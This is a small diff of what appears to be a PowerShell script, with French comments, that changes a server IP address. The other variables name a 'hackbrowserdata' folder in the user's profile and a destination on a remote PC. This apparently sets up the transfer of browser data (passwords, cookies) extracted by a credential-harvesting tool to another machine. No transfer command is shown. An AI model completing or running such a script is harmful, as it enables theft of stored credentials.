@@ -1,6 +1,6 @@
 # Variables 
 $serverUser = "DELL"
-$serverIP = "10.5.0.2"  # Remplace par l'IP du premier PC
+$serverIP = "192.168.0.117"  # Remplace par l'IP du premier PC
 $destDir = "C:\Users\$serverUser\hackbrowserdata"  # Chemin correct pour Windows
 $localPath = "$env:USERPROFILE\hackbrowserdata"
 
